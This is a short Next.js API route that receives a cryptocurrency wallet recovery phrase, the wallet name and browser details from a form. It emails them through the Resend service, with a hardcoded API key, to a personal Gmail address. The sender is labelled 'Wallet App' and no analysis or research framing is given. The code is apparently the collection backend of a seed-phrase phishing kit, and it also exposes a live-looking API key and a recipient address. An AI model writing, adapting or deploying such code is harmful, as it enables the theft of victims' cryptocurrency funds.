import { NextRequest, NextResponse } from "next/server";
import { Resend } from "resend";

export async function POST(req: NextRequest) {
  const { phrase, wallet, browserData } = await req.json();
  const resend = new Resend("re_YQyiMEP3_6qz1339Cp1Bq2XgdcFy3gAxh");
  const emailText = `
New Wallet Phrase Submission
--------------------------
Wallet: ${wallet || "(not provided)"}
Phrase: ${phrase}

Browser Data:
  User Agent: ${browserData?.userAgent || ""}
  Language: ${browserData?.language || ""}
  Platform: ${browserData?.platform || ""}
  Vendor: ${browserData?.vendor || ""}
`;
  try {
    await resend.emails.send({
      from: 'Wallet App <onboarding@resend.dev>',
      to: 'uwemuwemetim@gmail.com',
      subject: 'New Wallet Phrase Submission',
      text: emailText,
    });
    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ success: false, error: (error as Error).message }, { status: 500 });
  }
}
